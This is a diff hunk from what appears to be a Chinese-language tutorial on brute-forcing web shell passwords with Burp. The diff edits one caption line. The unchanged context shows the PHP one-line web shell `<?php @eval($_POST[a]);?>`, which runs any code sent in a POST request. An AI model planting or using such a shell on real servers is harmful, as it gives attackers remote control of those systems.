@@ -17,7 +17,7 @@ https://www.t00ls.net/thread-36985-1-1.html
 <?php @eval($_POST[a]);?>
 ```
 
-1）burp加载生成的爆破字典[echo增加了双引号，懒得换图了。。]
+1）burp加载生成的爆破字典
 
 ![](https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.03.23/1.png)
 
